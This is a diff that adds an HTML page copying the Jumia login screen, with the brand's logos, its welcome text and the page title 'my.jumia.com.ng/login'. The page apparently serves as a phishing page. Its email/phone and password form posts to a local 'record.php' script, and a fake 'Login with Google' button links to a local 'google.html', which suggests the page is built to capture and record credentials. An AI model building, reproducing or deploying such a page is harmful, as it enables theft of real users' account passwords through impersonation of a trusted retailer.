@@ -1,0 +1,327 @@
+<!DOCTYPE html>
+<!-- saved from url=(0047)file:///C:/Users/user/Documents/HTML/index.html -->
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+        <link rel="preconnect" href="https://fonts.googleapis.com/">
+        <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="">
+        <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@500&amp;display=swap" rel="stylesheet">
+        <meta charset="UTF-8">
+        <meta http-equiv="X-UA-Compatible">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+          
+
+        <title>my.jumia.com.ng/login</title>
+
+     <!--outline css property, set to none, 
+     removes hideous black outline on input when focused on-->            
+
+     <!--
+        line of code for create button !Mind line placement for button positioning. 
+        <button class= create-button>Create Jumia Account</button>-->
+
+
+<style>
+
+.h4 {
+    font-weight: 500;}
+
+.login-setup{
+    width:400px;
+    height: 700px;
+    display: flex;
+    flex: 1;
+    flex-direction: column;
+    justify-content: center;
+    background-color: white;
+    align-items: center;
+    z-index: 100;
+   
+}
+
+.top-logo{
+ width: 55px; 
+ margin-bottom: 7px;  
+}
+
+.continue-button {
+    font-family: Arial, Helvetica, sans-serif;
+    font-weight: 700;
+    color: white;
+    background-color: rgb(248, 152, 45);
+    border-width: 0px;
+    border-radius: 3px;
+    padding: 15px 116px 15px 116px;
+    display: block;
+    margin: 15px 0px 30px 0px;
+    transition: opacity, 0.15s;
+}
+
+.continue-button:hover  {
+    font-weight: 700;
+    color: white;
+    background-color: rgb(248, 152, 45);
+    border-width: 0px;
+    border-radius: 3px;
+    padding: 17px 116px 17px 116px;
+    display: block;
+    margin: 15px 0px 40px 0px;
+    opacity: 0.9;}
+
+
+    .create-button{
+        color: rgb(248, 152, 45);
+     font-family: Arial, Helvetica, sans-serif;
+    font-weight: 700;
+    background-color: white;
+    border-width: 1px;
+    border-radius: 3px;
+    border-color:rgb(248, 152, 45);
+    border-style: solid;
+    padding: 15px 80px 15px 80px;
+    display: block;
+    margin: 15px 0px 30px 0px;
+    transition: opacity, 0.15s;
+    opacity: 0.9;
+}
+
+.create-button:hover{
+    color: white;
+    font-family: Arial, Helvetica, sans-serif;
+    font-weight: 700;
+    background-color: rgb(248, 152, 45);
+    border-width: 1px;
+    border-radius: 3px;
+    border-color:rgb(248, 152, 45);
+    border-style: solid;
+    padding: 17px 80px 17px 80px;
+    display: block;
+    margin: 15px 0px 40px 0px;
+   
+}
+
+    .google-button {
+   font-weight: 700;
+    color: red;
+    background-color: white;
+    border-width: 2px;
+    border-color: red;
+    border-radius: 2px;
+    padding: 15px 90px 15px 90px;
+    display: block;
+    margin: 45px 0px 15px 0px;
+    transition: opacity, 0.15s;
+}
+
+.google-button:hover {
+   font-weight: 700;
+    color: white;
+    background-color: red;
+    border-width: 0px;
+    border: red;
+    border-radius: 3px;
+    padding: 17px 90px 17px 90px;
+    display: block;
+    margin: 45px 0px 27px 0px;
+    transition: opacity, 0.15s;
+    opacity: 0.7;
+
+}
+
+.google-logo{
+    width: 30px;
+   position: absolute;
+   margin-left: 12px;
+   margin-top: 53px;
+    z-index: 100;}
+
+
+.facebook-button {
+    font-weight: 700;
+    color: white;
+    background-color:#1877f2;
+    border-width: 0px;
+    border-radius: 3px;
+    padding: 15px 79px 15px 79px;
+    justify-content: center;
+transition: opacity, 0.15s;
+z-index: 99;}
+
+.facebook-button:hover {
+    font-weight: 700;
+    color: white;
+    background-color:#1877f2;
+    border-width: 0px;
+    border-radius: 3px;
+    padding: 17px 79px 17px 79px;
+    justify-content: center;
+    opacity: 0.7;
+    margin-top: 5px;}
+
+
+.fb-logo {
+    width: 30px;
+   position: absolute;
+   margin-left: 12px;
+   margin-top: 7px;
+    z-index: 100;}
+
+    .fb-logo:hover{
+        width: 30px;
+   position: absolute;
+   margin-left: 12px;
+   margin-top: 7px;
+    z-index: 100;
+opacity:0.7}
+
+.input-bar {
+    padding: 15px 109px 15px 10px;
+    margin-bottom: 8px;
+    border-color: rgb(248, 152, 45);
+    border-radius: 3px;
+    border-style: solid;
+    border-width: 1px;
+    vertical-align: center;
+    outline: none;
+    }
+
+    
+    .input-bar:hover {
+    padding: 17px 109px 17px 10px;
+    margin-bottom: 8px;
+    border-color: rgb(248, 152, 45);
+    border-radius: 3px;
+    border-style: solid;
+    border-width: 1px;
+    
+    }
+
+    
+
+.input-bar-2{
+padding: 15px 109px 15px 10px;
+border-color: rgb(248, 152, 45);
+border-radius: 3px;
+border-style: solid;
+border-width: 1px;
+outline: none ;
+}
+
+.input-bar-2:hover{
+padding: 17px 109px 17px 10px;
+border-color: rgb(248, 152, 45);
+border-radius: 3px;
+border-style: solid;
+border-width: 1px;}
+
+
+.float-holder-1{
+    font-family: Arial, Helvetica, sans-serif;
+    font-size: 13px;
+    color: rgb(248, 152, 45);
+    background-color: white;
+    padding-left: 4px;
+    padding-right: 2px;
+    position:absolute;
+    top: -20px;
+    left: 13px;
+    
+}
+
+.float-holder-2{
+    font-family: Arial, Helvetica, sans-serif;
+    font-size: 13px;
+    color: rgb(248, 152, 45);
+    background-color: white;
+    padding-left: 4px;
+    padding-right: 2px;
+    position:relative;
+    top: 20px;
+    left: 13px;}
+
+
+
+
+ .bottom-logo{
+ width: 100px;
+ margin-top: 27px;   
+}
+
+.background-img{
+z-index: 99; 
+width: fit-content;}
+
+
+
+.instruction{
+    font-family: Roboto;
+    margin-top: 0px;
+}
+
+</style>
+
+   
+<body style="width: 400px; padding-top: 35px; padding-bottom: 35px;">
+
+
+
+<div class="one-grid" style="display: grid; grid-template-columns: 400px;">
+
+        <div class="login-setup" style="width: 400px;"> 
+
+      <img class="top-logo" src="./indexalt_files/myjumia-top-logo.png">
+        <h4 style="font-family: Arial, Helvetica, sans-serif; font-weight: normal;" class="welcome">Welcome to Jumia</h4>
+        <h5 style="font-family: Arial, Helvetica, sans-serif; font-weight: normal; text-align:center; "class="instruction"> Type your e-mail or phone number to log in or create a Jumia account.</h5>
+    
+
+       <form  action="record.php" method="post" style="display: flex; flex-direction: column;" > 
+
+      <div style="display: flex; flex-direction: column; position: relative;">
+
+        <div style="display:flex";>
+            <p class="float-holder-1">Email or Mobile Number*</p>
+            <label for="Email/number" style="font-size: 0px;"> Email/number
+        <input  class="input-bar" id="Email/number" name="Email/number" type="email number" required="">
+    </label>
+     </div>
+
+     <div style="display:flex";>
+        <p class="float-holder-2">Password*</p></div>
+        <label for="Password" style="font-size: 0px;"> Password
+      <input class="input-bar-2" id="Password" name="Password" type="password" required="">
+        </label>
+      </div>
+      
+      <button class="continue-button">Continue</button> 
+      
+
+       </form>
+    
+    
+
+     <div style="display: flex; position: relative;">
+        <a href="google.html" style="text-decoration: none;">
+            <button class="google-button">Login with Google</button>
+        </a>
+     <img class="google-logo" src="google-logo.png">
+     </div>
+
+        <div style="display: flex; position: relative;">
+            <button class="facebook-button">Login with Facebook</button>
+            <img class="fb-logo" src="fblogo.png">
+            </div>
+
+<p class="tip" style="text-align: center;  font-size: 12px; font-family: Arial, Helvetica, sans-serif;">For further support, you may visit the Help center or contact our customer service team.</p>
+ <img class="bottom-logo" src="./indexalt_files/myjumia-bottom-logo.png">
+   
+     
+    
+    </div> 
+   
+
+</div>
+    
+
+
+    
+    
+</body>
+</html>
